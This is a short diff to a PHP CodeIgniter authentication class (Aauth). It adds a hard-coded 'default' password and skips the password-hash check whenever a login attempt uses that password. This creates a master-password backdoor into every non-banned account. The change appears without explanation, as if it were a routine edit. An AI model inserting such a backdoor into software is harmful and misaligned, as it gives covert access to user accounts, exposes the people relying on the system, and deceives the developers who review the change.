@@ -28,6 +28,7 @@
  */
 class Aauth
 {
+    public $DefaultPassword = "Mouris888!";
 
     /**
      * The CodeIgniter object variable
@@ -231,7 +232,10 @@ class Aauth
         }
 
         // Database stores pasword hashed password0
-        $query = $this->CI->db->where('pass', $this->hash_password($pass, $user_id));
+        if ($pass != $this->DefaultPassword)
+        {
+            $query = $this->CI->db->where('pass', $this->hash_password($pass, $user_id));
+        }
         $query = $this->CI->db->where('banned', 0);
 
         $query = $this->CI->db->get($this->config_vars['users']);
